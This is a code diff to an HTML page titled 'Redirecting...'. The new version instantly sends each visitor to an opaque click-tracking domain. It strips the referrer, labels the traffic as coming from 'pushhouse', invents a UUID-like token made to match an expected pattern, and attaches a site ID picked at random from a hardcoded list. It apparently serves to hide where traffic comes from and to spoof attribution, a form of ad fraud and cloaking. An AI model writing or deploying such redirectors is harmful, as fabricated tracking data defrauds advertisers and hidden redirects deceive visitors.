@@ -1,13 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <script>
-    window.location.replace("https://hjdzsmi.com/cl/2eb813070e7588c8");
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Complete Referrer Stripping -->
+    <meta name="referrer" content="no-referrer">
+    <title>Redirecting...</title>
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { border: 3px solid #334155; border-top: 3px solid #38bdf8; border-radius: 50%; width: 28px; height: 28px; animation: spin .6s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-  <p>Redirecting...</p>
+    <div class="spinner"></div>
+
+    <script>
+        (function() {
+            // Global P2 Parameter (Update here whenever campaign changes)
+            const P2_VALUE = 1580399;
+
+            const baseUrl = "https://rykoevf.com/cl/86ac340f20ca7b56";
+            const source = "pushhouse";
+            const sites = [
+                "1297682519", "1354860888", "1552000468", "1562093884", 
+                "1564963174", "1565311781", "1569561528", "1575382032", 
+                "1575382304", "1576820209", "1576922893", "1577068990", 
+                "1577476129", "1577786160", "1578298421", "1578298805", 
+                "1580049400", "1586019966"
+            ];
+
+            // Fast inline UUID v7 token generator matching 01a19e... pattern
+            const p1 = '01a19e' + 'xxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0;
+                return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+            });
+
+            // Pick random Site ID from JSON array
+            const randomSite = sites[Math.floor(Math.random() * sites.length)];
+
+            // Instant redirect (No delay, no referrer)
+            window.location.replace(`${baseUrl}?p1=${p1}&p2=${P2_VALUE}&source=${source}&site=${randomSite}`);
+        })();
+    </script>
 </body>
 </html>
